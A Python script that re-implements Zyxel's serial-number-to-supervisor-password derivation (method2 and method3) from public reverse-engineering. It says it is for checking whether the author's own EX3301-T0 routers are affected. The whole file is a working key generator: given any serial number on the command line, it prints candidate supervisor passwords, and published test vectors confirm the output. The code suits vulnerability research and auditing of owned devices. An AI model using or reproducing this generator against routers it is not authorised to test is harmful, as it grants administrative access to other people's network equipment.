"""Zyxel supervisor-password key derivation from serial number.

Clean re-implementation (our own code) of the publicly reverse-engineered
`zcfgBeCommonGenKeyBySerialNumMethod2/3` functions from Zyxel's libzcfg_be.so,
as documented by Thomas Rinsma (th0mas.nl) and Bogi N. Wennerstrøm (boginw).
Used to test the hypothesis that our EX3301-T0 supervisor passwords are
serial-derived (CVE-2023-28770 family). Validated against published test
vectors in test_keygen().

Only hashlib — no network, no device contact. This computes a candidate; it
proves nothing until it matches a real (serial -> password) pair.
"""
from __future__ import annotations

import hashlib

VALSTR = "23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789ABCDEF"
KEY1, KEY2, KEY3 = b"IO", b"lo", b"10"
OFF1, OFF2 = 0x8, 0x20


def _hx(b: int) -> str:
    """One md5 byte -> 2 chars, Zyxel-style: single hex digit is DUPLICATED."""
    s = format(b, "x")
    return s + s if len(s) == 1 else s


def _double_hash(inp: str, size: int) -> bytearray:
    md5 = hashlib.md5(inp.encode("ascii")).digest()
    round1 = "".join(_hx(md5[i]) for i in range(16))      # 32 chars
    md5 = hashlib.md5(round1.encode("ascii")).digest()
    round2 = "".join(_hx(md5[i]) for i in range(16))      # 32 chars
    round3 = bytearray(size)
    for i in range(size):
        round3[i] = ord(round2[i * 3])                    # every 3rd char
    return round3


def method2(serial: str) -> str:
    return _double_hash(serial, 8).decode("ascii")


def _mod3(seed: int):
    round4 = [0] * 16
    f0 = f1 = f2 = 0
    while f0 == 0 or f1 == 0 or f2 == 0:
        f0 = f1 = f2 = 0
        p2 = 1
        seed += 1
        for i in range(10):
            round4[i] = seed % (p2 * 3) // p2
            if round4[i] == 1:
                f1 += 1
            elif round4[i] == 2:
                f2 += 1
            else:
                f0 += 1
            p2 <<= 1
    return seed, round4


def method3(serial: str) -> str:
    r = bytearray(_double_hash(serial, 10).decode("ascii").upper(), "ascii")
    md5 = hashlib.md5(serial.encode("ascii")).digest()
    n = (md5[1] << 8) + md5[2]
    n, round4 = _mod3(n)
    for i in range(10):
        c = r[i]
        if round4[i] == 1:
            r[i] = (c % 26) + ord("A")
            for j in range(2):
                if r[i] == KEY1[j]:
                    r[i] = ord(VALSTR[OFF1 + ((n + j) % 0x18)]); break
        elif round4[i] == 2:
            r[i] = (c % 26) + ord("a")
            for j in range(2):
                if r[i] == KEY2[j]:
                    r[i] = ord(VALSTR[OFF2 + ((n + j) % 0x18)]); break
        else:
            r[i] = (c % 10) + ord("0")
            for j in range(2):
                if r[i] == KEY3[j]:
                    var = ((n + j) >> 0x1f) >> 0x1d
                    r[i] = ord(VALSTR[((n + j + var) & 7) - var]); break
    return r[:10].decode("ascii")


def candidates(serial: str) -> dict[str, str]:
    """All derivation variants we implement, keyed by name."""
    return {"method2": method2(serial), "method3": method3(serial)}


# Published reference vectors (from boginw/zyxel-vmg8825-keygen tests/).
_VECTORS = {
    "S200Y20000000": {"method2": "46901a90", "method3": "A4FwX57859"},
}


def test_keygen() -> bool:
    ok = True
    for serial, exp in _VECTORS.items():
        got = candidates(serial)
        for fn, want in exp.items():
            mark = "OK " if got[fn] == want else "FAIL"
            if got[fn] != want:
                ok = False
            print(f"  [{mark}] {serial} {fn}: got={got[fn]} want={want}")
    return ok


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        for s in sys.argv[1:]:
            c = candidates(s)
            print(f"{s}: method2={c['method2']}  method3={c['method3']}")
    else:
        print("self-test:")
        print("ALL PASS" if test_keygen() else "MISMATCH")
